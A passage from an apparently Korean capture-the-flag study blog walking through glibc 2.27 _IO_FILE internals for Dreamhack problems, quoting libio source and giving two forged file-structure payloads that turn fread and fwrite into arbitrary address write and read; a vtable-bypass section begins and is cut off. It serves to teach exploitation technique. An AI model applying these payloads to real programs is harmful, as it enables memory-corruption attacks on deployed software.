  if (fp->_flags & (_IO_LINE_BUF|_IO_UNBUFFERED))
    {
#if 0
      _IO_flush_all_linebuffered ();
#else
      /* We used to flush all line-buffered stream.  This really isn't
	 required by any standard.  My recollection is that
	 traditional Unix systems did this for stdout.  stderr better
	 not be line buffered.  So we do just that here
	 explicitly.  --drepper */
      _IO_acquire_lock (_IO_stdout);

      if ((_IO_stdout->_flags & (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))
	  == (_IO_LINKED | _IO_LINE_BUF))
	_IO_OVERFLOW (_IO_stdout, EOF);

      _IO_release_lock (_IO_stdout);
#endif
    }
```

플래그 비트에 `_IO_LINE_BUF`와 `_IO_UNBUFFERED`가 설정되어 있지 않아야 한다  
<br>

<details markdown="1">
<summary>플래그 비트</summary>

```c
// /libio/bits/libio.h

#define _IO_UNBUFFERED 2
#define _IO_NO_READS 4 /* Reading not allowed */
#define _IO_NO_WRITES 8 /* Writing not allowd */
#define _IO_EOF_SEEN 0x10
#define _IO_ERR_SEEN 0x20
#define _IO_DELETE_DONT_CLOSE 0x40 /* Don't call close(_fileno) on cleanup. */
#define _IO_LINKED 0x80 /* Set if linked (using _chain) to streambuf::_list_all.*/
#define _IO_IN_BACKUP 0x100
#define _IO_LINE_BUF 0x200
```

</details>
<br>

---

```c
// /libio/genops.c

int
_IO_switch_to_get_mode (_IO_FILE *fp)
{
  if (fp->_IO_write_ptr > fp->_IO_write_base)
    if (_IO_OVERFLOW (fp, EOF) == EOF)
      return EOF;
  if (_IO_in_backup (fp))
    fp->_IO_read_base = fp->_IO_backup_base;
  else
    {
      fp->_IO_read_base = fp->_IO_buf_base;
      if (fp->_IO_write_ptr > fp->_IO_read_end)
	fp->_IO_read_end = fp->_IO_write_ptr;
    }
  fp->_IO_read_ptr = fp->_IO_write_ptr;

  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end = fp->_IO_read_ptr;

  fp->_flags &= ~_IO_CURRENTLY_PUTTING;
  return 0;
}
libc_hidden_def (_IO_switch_to_get_mode)
```

`_IO_switch_to_get_mode()`함수를 호출하는데 이 함수에 대한 정의는 `/libio/genops.c`{: .filepath}에 정의되어 있다  

`_IO_write_ptr`이 `_IO_write_base` 보다 작거나 같아야 한다  

나머지는 딱히 EOF로 리턴되거나 하지도 않고, `SYSREAD`에 인자로 들어가지 않는 값들을 조작하는 로직이라 딱히 신경 쓸 필요는 없다  
<br>

---

#### read()로 AAW

```c
/* This is very tricky. We have to adjust those
     pointers before we call _IO_SYSREAD () since
     we may longjump () out while waiting for
     input. Those pointers may be screwed up. H.J. */
  fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
  fp->_IO_read_end = fp->_IO_buf_base;
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end
    = fp->_IO_buf_base;

  count = _IO_SYSREAD (fp, fp->_IO_buf_base,
		       fp->_IO_buf_end - fp->_IO_buf_base);
```

`_IO_SYSREAD` 즉 플로우에 이어 실행될 `read()` 함수의 인자로 `fp->_fineno`, `_IO_buf_base`, `_IO_buf_end`-`_IO_buf_base`가 들어간다  

(앞서 `_IO_file_read()` 함수에서 `fp`가 인자로 그대로 들어가지 않고 `_fileno` 멤버가 들어가는 것을 확인했다)  
<br>

---

```c
ssize_t read(int fd, void *buf, size_t count);
```

`read()` 함수의 프로토타입이다  
알고 있듯이 `buf` 공간에 `fd`의 내용을 `count` 만큼 집어넣게 된다  

그러면 결국 `fp->_filno`의 내용을 `_IO_buf_base`가 가리키는 공간에 `_IO_buf_end`-`_IO_buf_base` 길이 만큼 쓰게 된다  

여기서 `_fileno`까지 stdin을 나타내는 0으로 설정해주면 내가 입력한 값을 특정 주소로 AAW가 가능하다  
<br>

---

근데 다시 중요하게 봐야 할 조건이 하나 더 있다  

```c
// /libio/fileops.c

_IO_size_t
_IO_file_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n)
{
  _IO_size_t want, have;
  _IO_ssize_t count;
  char *s = data;

  want = n;

...

  /* If we now want less than a buffer, underflow and repeat
  the copy.  Otherwise, _IO_SYSREAD directly to
  the user buffer. */
if (fp->_IO_buf_base
    && want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base))
  {
    if (__underflow (fp) == EOF)
break;

    continue;
  }

...

}
```

`__underflow`가 실행되기 위해서는 `IO_buf_base`가 존재하고, `want` 값이 `_IO_buf_end`-`_IO_buf_base`보다 크거나 같아야 한다  

`want`는 인자로 받은 `n`인데 이 값은 `fread()` 함수에서 두번째 인자와 세번째 인자를 곱한 값이다  

본 문제에서는 1023이기에 `_IO_buf_end`-`_IO_buf_base`의 값이 1023 이상이 되도록 만들면 된다  
<br>

---

#### Payload

```python
_flags = 0xfbad0000,
_IO_read_ptr = 0x0,
_IO_read_end = 0x0,
_IO_read_base = 0x0,
_IO_write_base = 0x0,
_IO_write_ptr = 0x0,
_IO_write_end = 0x0,
_IO_buf_base = target, # overwrite_me
_IO_buf_end = target+1024, # buffer size >= 1024
_IO_save_base = 0x0,
_IO_backup_base = 0x0,
_IO_save_end = 0x0,
_markers = 0x0,
_chain = 0x0,
_fileno = 0x0, # stdin

payload = flat(
    _flags,
    _IO_read_ptr, _IO_read_end, _IO_read_base,
    _IO_write_base, _IO_write_ptr, _IO_write_end,
    _IO_buf_base, _IO_buf_end,
    _IO_save_base, _IO_backup_base, _IO_save_end,
    _markers, _chain, _fileno
)
```

pwntools에 있는 `FileStructure`을 사용하려 했으나 일부분만 덮어야 해서 보류한다  
쓰려면 잘라서 쓸 수 있겠지만 굳이..  

정리하면 다음과 같다  

- `_IO_buf_base` : 덮어쓸 주소  
- `_IO_buf_end` : 덮어쓸 주소 + (버퍼 크기 이상의 값)  
- `_IO_fileno` : stdin, 입력을 주어 AAW를 하기 위함  
<br>

---

## _IO_FILE AAR (Dreamhack #366) - Arbitrary Address Read

드림핵 문제를 풀고 있기에 이번에도 glibc 2.27 버전을 기준으로 작성하겠다  

### Code Analysis (glibc 2.27)

대략적인 분석 방향은 이전 AAW와 거의 비슷하다  
위의 내용을 이해했다면 AAR도 추가적인 설명 없이 충분히 이해할 수 있기에 AAR는 AAW보다는 비교적 간단하게 써볼 예정이다  
<br>

---

#### _IO_fwrite()

```c
// /libio/iofwrite.c

_IO_size_t
_IO_fwrite (const void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)
{
  _IO_size_t request = size * count;
  _IO_size_t written = 0;
  CHECK_FILE (fp, 0);
  if (request == 0)
    return 0;
  _IO_acquire_lock (fp);
  if (_IO_vtable_offset (fp) != 0 || _IO_fwide (fp, -1) == -1)
    written = _IO_sputn (fp, (const char *) buf, request);
  _IO_release_lock (fp);
  /* We have written all of the input in case the return value indicates
     this or EOF is returned.  The latter is a special case where we
     simply did not manage to flush the buffer.  But the data is in the
     buffer and therefore written as far as fwrite is concerned.  */
  if (written == request || written == EOF)
    return count;
  else
    return written / size;
}
libc_hidden_def (_IO_fwrite)

# include <stdio.h>
weak_alias (_IO_fwrite, fwrite)
```

`fwrite()`를 호출하면 `_IO_fwrite()`와 같은 동작을 수행하게 된다  

`CHECK_FILE`로 `fp`를 먼저 검사하고 `_IO_sputn()`을 호출하게 되는데, 인자로는 `fp`, `buf`, `request`를 전달한다  
여기에 `fwrite()` 함수로 전달했던 인자들을 사용하는데 `buf`, `fp`는 `fwrite()`에 직접적으로 들어갔던 인자들이고, `request`는 `size`*`count`이다  

원래라면 `fp` 파일에 `buf`의 내용을 `size`*`count` 만큼 쓰는 동작을 하게 될 것이다  
<br>

---

#### _IO_sputn()

```c
// /libio/libioP.h

# define _IO_JUMPS_FUNC(THIS) \
  (IO_validate_vtable                                                   \
   (*(struct _IO_jump_t **) ((void *) &_IO_JUMPS_FILE_plus (THIS)	\
			     + (THIS)->_vtable_offset)))

...

#define JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1, X2)

...

#define _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)

...

#define _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)
```

![Image](/assets/img/251102_0/_IO_file_xsputn.png)

`_IO_sgetn()`은 결국 `_IO_file_xsputn()` 함수를 호출하게 되는 것을 확인할 수 있다  
<br>

---

```c
// /libio/fileops.c

versioned_symbol (libc, _IO_new_file_xsputn, _IO_file_xsputn, GLIBC_2_1);
```

![Image](/assets/img/251102_0/_IO_new_file_xsputn.png)

`_IO_file_xsputn()`은 `_IO_new_file_xsputn()`과 같다  
`info symbol` 명령어로도 확인해볼 수 있다  
<br>

---

#### _IO_new_file_xsputn()

<details markdown="1">

<summary>전체 코드</summary>

```c
// /libio/fileops.c

_IO_size_t
_IO_new_file_xsputn (_IO_FILE *f, const void *data, _IO_size_t n)
{
  const char *s = (const char *) data;
  _IO_size_t to_do = n;
  int must_flush = 0;
  _IO_size_t count = 0;

  if (n <= 0)
    return 0;
  /* This is an optimized implementation.
     If the amount to be written straddles a block boundary
     (or the filebuf is unbuffered), use sys_write directly. */

  /* First figure out how much space is available in the buffer. */
  if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING))
    {
      count = f->_IO_buf_end - f->_IO_write_ptr;
      if (count >= n)
	{
	  const char *p;
	  for (p = s + n; p > s; )
	    {
	      if (*--p == '\n')
		{
		  count = p - s + 1;
		  must_flush = 1;
		  break;
		}
	    }
	}
    }
  else if (f->_IO_write_end > f->_IO_write_ptr)
    count = f->_IO_write_end - f->_IO_write_ptr; /* Space available. */

  /* Then fill the buffer. */
  if (count > 0)
    {
      if (count > to_do)
	count = to_do;
      f->_IO_write_ptr = __mempcpy (f->_IO_write_ptr, s, count);
      s += count;
      to_do -= count;
    }
  if (to_do + must_flush > 0)
    {
      _IO_size_t block_size, do_write;
      /* Next flush the (full) buffer. */
      if (_IO_OVERFLOW (f, EOF) == EOF)
	/* If nothing else has to be written we must not signal the
	   caller that everything has been written.  */
	return to_do == 0 ? EOF : n - to_do;

      /* Try to maintain alignment: write a whole number of blocks.  */
      block_size = f->_IO_buf_end - f->_IO_buf_base;
      do_write = to_do - (block_size >= 128 ? to_do % block_size : 0);

      if (do_write)
	{
	  count = new_do_write (f, s, do_write);
	  to_do -= count;
	  if (count < do_write)
	    return n - to_do;
	}

      /* Now write out the remainder.  Normally, this will fit in the
	 buffer, but it's somewhat messier for line-buffered files,
	 so we let _IO_default_xsputn handle the general case. */
      if (to_do)
	to_do -= _IO_default_xsputn (f, s+do_write, to_do);
    }
  return n - to_do;
}
libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)
```

</details>

이번에는 코드 분석과 함께 Up-to-Down을 약간 섞어 파일 구조체 조건까지 함께 보도록 한다  

일단 결론부터 말하면 `_IO_OVERFLOW()` 함수를 실행하여 AAR을 할 수 있다  
해당 함수를 실행하기 위해 앞의 조건들을 맞춰주어야 한다
<br>

---

```c
// /libio/fileops.c

_IO_new_file_xsputn (_IO_FILE *f, const void *data, _IO_size_t n)
```

우선, `_IO_new_file_xsputn()` 함수에는 인자로, `f`, `data`, `n`이 들어간다  

각각 `fwrite()`에 전달한 인자와 매칭시키면 `fwrite()`의 `fp`는 `f`, `buf`는 `data` 그리고 `size`*`count`가 `n`에 매치된다   
<br>

---

```c
// /libio/fileops.c

if (n <= 0)
  return 0;
/* This is an optimized implementation.
    If the amount to be written straddles a block boundary
    (or the filebuf is unbuffered), use sys_write directly. */

/* First figure out how much space is available in the buffer. */
if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING))
  {
    count = f->_IO_buf_end - f->_IO_write_ptr;
    if (count >= n)
{
  const char *p;
  for (p = s + n; p > s; )
    {
      if (*--p == '\n')
  {
    count = p - s + 1;
    must_flush = 1;
    break;
  }
    }
}
  }
else if (f->_IO_write_end > f->_IO_write_ptr)
  count = f->_IO_write_end - f->_IO_write_ptr; /* Space available. */
```

일단 당연히 `n`이 0이거나 음수이면 안 된다  
아무것도 안 쓰거나 뒤로 쓸 건 아니니까..  

~~플래그 값도 검증하고 이것저것 값들을 만지는데 사실상 `_IO_OVERFLOW()`까지 가는 데에는 영향이 없다고 봐도 될 것 같다~~  

`data`에 `n` 바이트가 다 들어간다면 해당 `n` 바이트 안에 개행 문자가 있는지 뒤에서부터 찾고, 만약 개행이 있다면 그 줄의 끝(개행 문자)까지만 write하고 flush하기 위해 `must_flush`를 1로 설정한다  
(다 들어가지 않는다면 `count`는 `fp` 구조체의 `_IO_buf_end`와 `_IO_write_ptr`의 차)

플래그에 `_IO_LINE_BUF`(0x200)와 `_IO_CURRENTLY_PUTTING`(0x800)이 없다면 `count`는 `fp` 구조체의 `_IO_write_end`와 `_IO_write_ptr`의 차가 된다  
<br>

---

```c
// /libio/fileops.c

/* Then fill the buffer. */
if (count > 0)
  {
    if (count > to_do)
count = to_do;
    f->_IO_write_ptr = __mempcpy (f->_IO_write_ptr, s, count);
    s += count;
    to_do -= count;
  }
if (to_do + must_flush > 0)
  {
    _IO_size_t block_size, do_write;
    /* Next flush the (full) buffer. */
    if (_IO_OVERFLOW (f, EOF) == EOF)
/* If nothing else has to be written we must not signal the
    caller that everything has been written.  */
return to_do == 0 ? EOF : n - to_do;
  }
```

`to_do`는 write해야 할 데이터의 크기로, `data`의 공간이 부족해 write하지 못한 남은 데이터가 있는 경우 그 남은 바이트가 `to_do`로 설정된다  

이렇게 버퍼에 다 못 넣어 남은 데이터가 있거나 `must_flush`가 1로 설정되어 있다면 `_IO_OVERFLOW()` 함수를 실행시킬 수 있다  

따라서, 이를 트리거하기 위해서는 `_IO_write_end`와 `_IO_write_ptr`을 잘 조작해서 `to_do`가 0보다 크도록 만들면 된다  
<br>

---

#### _IO_OVERFLOW

```c
// /libio/libioP.h

#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)

...

#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)
```

```c
// /libio/fileops.c

versioned_symbol (libc, _IO_new_file_overflow, _IO_file_overflow, GLIBC_2_1);

...

  JUMP_INIT(overflow, _IO_file_overflow),
```

![Image](/assets/img/251102_0/_IO_file_overflow.png)

![Image](/assets/img/251102_0/_IO_new_file_overflow.png)

`_IO_OVERFLOW()`는 `_IO_file_overflow()`를 호출하게 되는 것을 알 수 있다  
`_IO_file_overflow()`는 `_IO_new_file_overflow()` 함수의 다른 이름이라고 봐도 무방하다  
<br>

---

<details markdown="1">

<summary>전체 코드</summary>

```c
// /libio/fileops.c

int
_IO_new_file_overflow (_IO_FILE *f, int ch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
    {
      /* Allocate a buffer if needed. */
      if (f->_IO_write_base == NULL)
	{
	  _IO_doallocbuf (f);
	  _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);
	}
      /* Otherwise must be currently reading.
	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,
	 logically slide the buffer forwards one block (by setting the
	 read pointers to all point at the beginning of the block).  This
	 makes room for subsequent output.
	 Otherwise, set the read pointers to _IO_read_end (leaving that
	 alone, so it can continue to correspond to the external position). */
      if (__glibc_unlikely (_IO_in_backup (f)))
	{
	  size_t nbackup = f->_IO_read_end - f->_IO_read_ptr;
	  _IO_free_backup_area (f);
	  f->_IO_read_base -= MIN (nbackup,
				   f->_IO_read_base - f->_IO_buf_base);
	  f->_IO_read_ptr = f->_IO_read_base;
	}

      if (f->_IO_read_ptr == f->_IO_buf_end)
	f->_IO_read_end = f->_IO_read_ptr = f->_IO_buf_base;
      f->_IO_write_ptr = f->_IO_read_ptr;
      f->_IO_write_base = f->_IO_write_ptr;
      f->_IO_write_end = f->_IO_buf_end;
      f->_IO_read_base = f->_IO_read_ptr = f->_IO_read_end;

      f->_flags |= _IO_CURRENTLY_PUTTING;
      if (f->_mode <= 0 && f->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
	f->_IO_write_end = f->_IO_write_ptr;
    }
  if (ch == EOF)
    return _IO_do_write (f, f->_IO_write_base,
			 f->_IO_write_ptr - f->_IO_write_base);
  if (f->_IO_write_ptr == f->_IO_buf_end ) /* Buffer is really full */
    if (_IO_do_flush (f) == EOF)
      return EOF;
  *f->_IO_write_ptr++ = ch;
  if ((f->_flags & _IO_UNBUFFERED)
      || ((f->_flags & _IO_LINE_BUF) && ch == '\n'))
    if (_IO_do_write (f, f->_IO_write_base,
		      f->_IO_write_ptr - f->_IO_write_base) == EOF)
      return EOF;
  return (unsigned char) ch;
}
libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)
```

</details>

```c
// /libio/fileops.c

_IO_new_file_overflow (_IO_FILE *f, int ch)
```

이전 코드의 `_IO_new_file_xsputn()` 함수에서도 확인했듯 `_IO_new_file_overflow()` 함수의 인자로는 `fp`와 `EOF`를 각각 `f`와 `ch`로 받는다  
<br>

---

```c
// /libio/fileops.c

if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
  {
    f->_flags |= _IO_ERR_SEEN;
    __set_errno (EBADF);
    return EOF;
  }
```

플래그에 쓰기 권한이 없어야 한다 (`_IO_NO_WRITES` = 0x8)  
EOF가 리턴되지 않게..  
<br>

---

```c
// /libio/fileops.c

if (ch == EOF)
  return _IO_do_write (f, f->_IO_write_base,
    f->_IO_write_ptr - f->_IO_write_base);
```

`_IO_do_write()`를 호출하게 해야 한다  
<br>

---

```c
// /libio/fileops.c

if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
  {
    /* Allocate a buffer if needed. */
    if (f->_IO_write_base == NULL)
{
  _IO_doallocbuf (f);
  _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);
}
    /* Otherwise must be currently reading.
  If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,
  logically slide the buffer forwards one block (by setting the
  read pointers to all point at the beginning of the block).  This
  makes room for subsequent output.
  Otherwise, set the read pointers to _IO_read_end (leaving that
  alone, so it can continue to correspond to the external position). */
    if (__glibc_unlikely (_IO_in_backup (f)))
{
  size_t nbackup = f->_IO_read_end - f->_IO_read_ptr;
  _IO_free_backup_area (f);
  f->_IO_read_base -= MIN (nbackup,
          f->_IO_read_base - f->_IO_buf_base);
  f->_IO_read_ptr = f->_IO_read_base;
}

    if (f->_IO_read_ptr == f->_IO_buf_end)
f->_IO_read_end = f->_IO_read_ptr = f->_IO_buf_base;
    f->_IO_write_ptr = f->_IO_read_ptr;
    f->_IO_write_base = f->_IO_write_ptr;
    f->_IO_write_end = f->_IO_buf_end;
    f->_IO_read_base = f->_IO_read_ptr = f->_IO_read_end;

    f->_flags |= _IO_CURRENTLY_PUTTING;
    if (f->_mode <= 0 && f->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
f->_IO_write_end = f->_IO_write_ptr;
  }
```

해당 조건문이 트리거되면 멤버값이 변경되므로 나중에 멤버값 조정하기 매우 귀찮아진다..  
이를 방지하기 위해 `_IO_CURRENTLY_PUTTING`(0x800)을 플래그로 설정하지 않도록 한다    
<br>

---

```c
// /libio/fileops.c

if (ch == EOF)
  return _IO_do_write (f, f->_IO_write_base,
      f->_IO_write_ptr - f->_IO_write_base);

...

versioned_symbol (libc, _IO_new_do_write, _IO_do_write, GLIBC_2_1);
```

![Image](/assets/img/251102_0/_IO_new_do_write.png)

`_IO_do_write()`는 `_IO_new_do_write()` 함수와 같다  

인자로 `f`, `f->_IO_write_base`, `f->_IO_write_ptr` - `f->_IO_write_base`를 전달한다  
<br>

---

#### _IO_new_do_write()

```c
// /libio/fileops.c

int
_IO_new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
  return (to_do == 0
	  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;
}
libc_hidden_ver (_IO_new_do_write, _IO_do_write)
```

```c
// /libio/fileops.c

static
_IO_size_t
new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
  _IO_size_t count;
  if (fp->_flags & _IO_IS_APPENDING)
    /* On a system without a proper O_APPEND implementation,
       you would need to sys_seek(0, SEEK_END) here, but is
       not needed nor desirable for Unix- or Posix-like systems.
       Instead, just indicate that offset (before and after) is
       unpredictable. */
    fp->_offset = _IO_pos_BAD;
  else if (fp->_IO_read_end != fp->_IO_write_base)
    {
      _IO_off64_t new_pos
	= _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
      if (new_pos == _IO_pos_BAD)
	return 0;
      fp->_offset = new_pos;
    }
  count = _IO_SYSWRITE (fp, data, to_do);
  if (fp->_cur_column && count)
    fp->_cur_column = _IO_adjust_column (fp->_cur_column - 1, data, count) + 1;
  _IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_buf_base;
  fp->_IO_write_end = (fp->_mode <= 0
		       && (fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
		       ? fp->_IO_buf_base : fp->_IO_buf_end);
  return count;
}
```

`_IO_new_do_write()`는 `new_do_write()`로 이어진다  
인자는 동일하다  

`_IO_read_end`와 `_IO_write_base`가 같으면 `_IO_SYSWRITE()`를 호출하게 된다  
만약 같지 않으면 `return 0`이 호출되는 것 같다  

`_IO_SYSWRITE()`의 함수로는 인자로 `fp`, `data`, `to_do`가 전달된다  
이 인자들은 `_IO_new_do_write()` 함수에서 받은 인자와 같다  
<br>

---

#### _IO_SYSWRITE()

![Image](/assets/img/251102_0/_IO_file_write.png)

```c
// /libio/fileops.c

versioned_symbol (libc, _IO_new_file_write, _IO_file_write, GLIBC_2_1);
```

`_IO_SYSWRITE()`는 `_IO_file_write()`함수를 호출하는 것을 볼 수 있다    
그리고 `_IO_file_write()`는 `_IO_new_file_write()`와 같다  

```c
// /libio/fileops.c

_IO_ssize_t
_IO_new_file_write (_IO_FILE *f, const void *data, _IO_ssize_t n)
{
  _IO_ssize_t to_do = n;
  while (to_do > 0)
    {
      _IO_ssize_t count = (__builtin_expect (f->_flags2
					     & _IO_FLAGS2_NOTCANCEL, 0)
			   ? __write_nocancel (f->_fileno, data, to_do)
			   : __write (f->_fileno, data, to_do));
      if (count < 0)
	{
	  f->_flags |= _IO_ERR_SEEN;
	  break;
	}
      to_do -= count;
      data = (void *) ((char *) data + count);
    }
  n -= to_do;
  if (f->_offset >= 0)
    f->_offset += n;
  return n;
}
```

`to_do`가 `n`이기 때문에 당연히 양수일 것이고 `__write()` 함수가 실행되게 된다  
<br>

---

#### __write()

![Image](/assets/img/251102_0/write.png)

플래그 조건이나 기타 조건들을 맞추어 디버깅해보면 `__write()` 함수는 `write()` 함수를 호출한다  
이를 사용해서 AAR을 할 수 있다  

특히 `write()`의 인자로 `f->_fileno`가 들어가는데 이 멤버값을 1로 조작하면 stdout으로 바꿀 수 있어서 특정 주소의 값을 stdout으로 출력 받아 AAR을 할 수 있다  
<br>

---

### Exploit

원리는 코드 분석과 함께 설명했으니 생략하고 페이로드만 조금 뜯어서 보자  

```python
_flags = 0xfbad0800,
_IO_read_ptr = 0x0,
_IO_read_end = target,
_IO_read_base = 0x0,
_IO_write_base = target,
_IO_write_ptr = target+0x100,
_IO_write_end = 0x0,
_IO_buf_base = 0x0,
_IO_buf_end = 0x0,
_IO_save_base = 0x0,
_IO_backup_base = 0x0,
_IO_save_end = 0x0,
_markers = 0x0,
_chain = 0x0,
_fileno = 0x1 # stdout

payload = flat(
    _flags,
    _IO_read_ptr, _IO_read_end, _IO_read_base,
    _IO_write_base, _IO_write_ptr, _IO_write_end,
    _IO_buf_base, _IO_buf_end,
    _IO_save_base, _IO_backup_base, _IO_save_end,
    _markers, _chain, _fileno
)
```

정리하면 다음과 같다  

- `_IO_write_base` : 읽을 주소   
- `_IO_read_end` : `_IO_write_base`와 같아야 한다  
- `_IO_write_ptr` : 읽을 주소 + (읽을 바이트 길이)   
- `_fineno` : stdout, 읽은 값 stdout으로 출력하여 AAR

다른 몇몇 글들에서는 `_flags`에 0x800 값을 OR하고 이 0x800이 `_IO_IS_APPENDING` 플래그라고 해놓았던데 `_IO_IS_APPENDING`은 0x1000이다..  
아마 한 명이 잘못 써서 다른 사람들도 잘못 알게 된 것 같은데 glibc 2.27 코드에서 0x800은 `_IO_CURRENTLY_PUTTING`의 값이다  
<br>

---

## _IO_FILE AW (Dreamhack #55) - Arbitrary Write

### Code Analysis (glibc 2.27)

#### _IO_fgets

```c
// /libio/iofgets.c

char *
_IO_fgets (char *buf, int n, _IO_FILE *fp)
{
  _IO_size_t count;
  char *result;
  int old_error;
  CHECK_FILE (fp, NULL);
  if (n <= 0)
    return NULL;
  if (__glibc_unlikely (n == 1))
    {
      /* Another irregular case: since we have to store a NUL byte and
	 there is only room for exactly one byte, we don't have to
	 read anything.  */
      buf[0] = '\0';
      return buf;
    }
  _IO_acquire_lock (fp);
  /* This is very tricky since a file descriptor may be in the
     non-blocking mode. The error flag doesn't mean much in this
     case. We return an error only when there is a new error. */
  old_error = fp->_IO_file_flags & _IO_ERR_SEEN;
  fp->_IO_file_flags &= ~_IO_ERR_SEEN;
  count = _IO_getline (fp, buf, n - 1, '\n', 1);
  /* If we read in some bytes and errno is EAGAIN, that error will
     be reported for next read. */
  if (count == 0 || ((fp->_IO_file_flags & _IO_ERR_SEEN)
		     && errno != EAGAIN))
    result = NULL;
  else
    {
      buf[count] = '\0';
      result = buf;
    }
  fp->_IO_file_flags |= old_error;
  _IO_release_lock (fp);
  return result;
}

weak_alias (_IO_fgets, fgets)
```

이전과 비슷하게 `fgets()` 함수를 호출하면 `_IO_fgets()`의 함수와 같은 동작을 수행한다  

인자로는 `buf` 포인터, `n`, `fp` 구조체 이렇게 3개를 받는다  
`fp` 구조체가 가리키는 파일에서 `n` 크기 만큼 데이터를 가져와 `buf`에 write하게 된다  
<br>

---

```c
old_error = fp->_IO_file_flags & _IO_ERR_SEEN;
fp->_IO_file_flags &= ~_IO_ERR_SEEN;
count = _IO_getline (fp, buf, n - 1, '\n', 1);
```

`count` 변수 값 계산하면서 `IO_getline()` 함수로 빠진다  

`fp` 구조체, `buf`와 3개 다른 값을 인자로 전달한다  
<br>

---

```c
// /libio/iogetline.c

_IO_size_t
_IO_getline (_IO_FILE *fp, char *buf, _IO_size_t n, int delim,
	     int extract_delim)
{
  return _IO_getline_info (fp, buf, n, delim, extract_delim, (int *) 0);
}
libc_hidden_def (_IO_getline)
```

`_IO_getline()` 함수는 다시 `_IO_getline_info()` 함수로 빠진다  
여기서 들어왔던 인자 순서가 살짝 바뀌어서 다시 들어간다  

일단 up-to-down 방식이니까 넘어가서 분석하도록 한다  
<br>

---

### _IO_sputbackc()

```c
// /libio/iogetline.c

_IO_size_t
_IO_getline_info (_IO_FILE *fp, char *buf, _IO_size_t n, int delim,
		  int extract_delim, int *eof)
{
  char *ptr = buf;
  if (eof != NULL)
    *eof = 0;
  if (__builtin_expect (fp->_mode, -1) == 0)
    _IO_fwide (fp, -1);
  while (n != 0)
    {
      _IO_ssize_t len = fp->_IO_read_end - fp->_IO_read_ptr;
      if (len <= 0)
	{
	  int c = __uflow (fp);
	  if (c == EOF)
	    {
	      if (eof)
		*eof = c;
	      break;
	    }
	  if (c == delim)
	    {
 	      if (extract_delim > 0)
		*ptr++ = c;
	      else if (extract_delim < 0)
		_IO_sputbackc (fp, c);
	      if (extract_delim > 0)
		++len;
	      return ptr - buf;
	    }
	  *ptr++ = c;
	  n--;
	}
      else
	{
	  char *t;
	  if ((_IO_size_t) len >= n)
	    len = n;
	  t = (char *) memchr ((void *) fp->_IO_read_ptr, delim, len);
	  if (t != NULL)
	    {
	      _IO_size_t old_len = ptr-buf;
	      len = t - fp->_IO_read_ptr;
	      if (extract_delim >= 0)
		{
		  ++t;
		  if (extract_delim > 0)
		    ++len;
		}
	      memcpy ((void *) ptr, (void *) fp->_IO_read_ptr, len);
	      fp->_IO_read_ptr = t;
	      return old_len + len;
	    }
	  memcpy ((void *) ptr, (void *) fp->_IO_read_ptr, len);
	  fp->_IO_read_ptr += len;
	  ptr += len;
	  n -= len;
	}
    }
  return ptr - buf;
}
libc_hidden_def (_IO_getline_info)
```

`_IO_getline_info()` 함수는 `_IO_getline()` 함수 바로 아래에 같이 선언되어 있다  

(나중에 이어서 작성 예정)  
<br>

---

## bypass IO_validate_vtable (Dreamhack #365) - 

### Exploit

```c
// /libio/iofclose.c

int
_IO_new_fclose (_IO_FILE *fp)
{
  int status;

  CHECK_FILE(fp, EOF);

#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)
  /* We desperately try to help programs which are using streams in a
     strange way and mix old and new functions.  Detect old streams
     here.  */
  if (_IO_vtable_offset (fp) != 0)
    return _IO_old_fclose (fp);
#endif

  /* First unlink the stream.  */
  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    _IO_un_link ((struct _IO_FILE_plus *) fp);

  _IO_acquire_lock (fp);
  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    status = _IO_file_close_it (fp);
  else
    status = fp->_flags & _IO_ERR_SEEN ? -1 : 0;
  _IO_release_lock (fp);
  _IO_FINISH (fp);
  if (fp->_mode > 0)
    {
      /* This stream has a wide orientation.  This means we have to free
	 the conversion functions.  */
      struct _IO_codecvt *cc = fp->_codecvt;

      __libc_lock_lock (__gconv_lock);
      __gconv_release_step (cc->__cd_in.__cd.__steps);
